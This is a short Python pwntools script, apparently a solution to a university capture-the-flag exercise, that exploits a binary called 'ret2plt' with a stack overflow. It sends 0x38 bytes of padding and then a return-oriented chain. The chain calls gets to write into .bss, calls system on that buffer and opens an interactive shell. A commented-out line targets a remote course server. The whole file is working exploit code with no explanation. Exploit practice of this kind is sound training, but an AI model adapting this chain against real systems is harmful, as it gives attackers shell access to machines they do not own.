#!/usr/bin/env python

from pwn import *

r = process('./ret2plt')
# r = remote('edu-ctf.csie.org', 10174)

pop_rdi_ret = 0x0000000000400733
system_plt = 0x0000000000400520
gets_plt = 0x0000000000400530
bss = 0x00601000

r.recvuntil(':D\n')

payload = p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(gets_plt)
# Calling Convention pass by register and clean frame self
payload += p64(pop_rdi_ret)
payload += p64(bss)
payload += p64(system_plt)

r.sendline('A' * 0x38 + payload)
r.interactive()
